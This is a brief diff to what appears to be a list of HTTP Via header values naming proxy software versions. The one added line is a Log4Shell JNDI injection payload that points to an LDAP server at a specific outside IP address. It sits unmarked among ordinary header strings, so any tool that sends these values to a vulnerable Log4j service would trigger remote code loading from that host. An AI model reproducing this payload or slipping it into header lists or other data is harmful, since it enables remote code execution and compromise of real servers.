@@ -1,3 +1,4 @@
+${jndi:ldap://185.8.172.132:1389/a}
 1.0 PROXY
 1.1 J5K-12 (jaguar/3.0-11)
 1.1 izj6c5wlll5csmagpei7jnz (squid/3.5.20)
